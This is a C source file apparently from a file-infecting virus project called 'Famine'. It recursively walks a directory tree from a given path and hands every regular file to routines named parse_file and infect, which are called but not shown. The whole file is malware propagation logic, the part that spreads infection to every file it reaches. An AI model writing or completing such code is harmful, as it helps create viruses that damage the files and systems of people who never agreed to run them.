#include "../include/famine.h"

void print_error(char *err, char *arg, t_arg_data *arg_data)
{
    if (!arg_data->debug)
        return;
    printf("Error: ");
    printf(err, arg);
}

void print_path(char *path, char *d_name, t_arg_data *data)
{
    if (!data->debug)
        return;
    if (strcmp(d_name, ".") && strcmp(d_name, ".."))
    printf("%s/%s\n", path, d_name);
}

void init_file(t_file *file, char *file_name)
{
    file->fd = -1;
    file->file_data = NULL;
    file->file_name = file_name;
    file->complet_file_name = NULL;
}

void manage_infection(char *path, char *file_name, t_file *file, t_arg_data *data)
{
    init_file(file, file_name);
    if (parse_file(path, file_name, file, data))
        infect(file);

    if (file->fd > 0)
        close(file->fd);
    if (file->complet_file_name)
        free(file->complet_file_name);
    if (file->file_data != MAP_FAILED)
        munmap(file->file_data, file->size_mmap);
}

void read_dir(t_arg_data *data, char *path)
{
    struct dirent* entity;
    t_file file;

    DIR* dir = opendir(path);
    if (!dir)
    {
        print_error("No dir \"%s\"", path, data);
        exit(1);
    }
    entity = readdir(dir);
    while (entity)
    {
        print_path(path, entity->d_name, data);
        if (entity->d_type == DT_REG)
            manage_infection(path, entity->d_name, &file, data);
        if (entity->d_type == DT_DIR && strcmp(entity->d_name, ".") && strcmp(entity->d_name, ".."))
        {
            char *new_path = calloc(strlen(entity->d_name) + strlen(path) + 2, sizeof(char));
            strcat(new_path, path);
            strcat(new_path, "/");
            strcat(new_path, entity->d_name);
            read_dir(data, new_path);
            free(new_path);
        }
        entity = readdir(dir);
    }
    closedir(dir);
}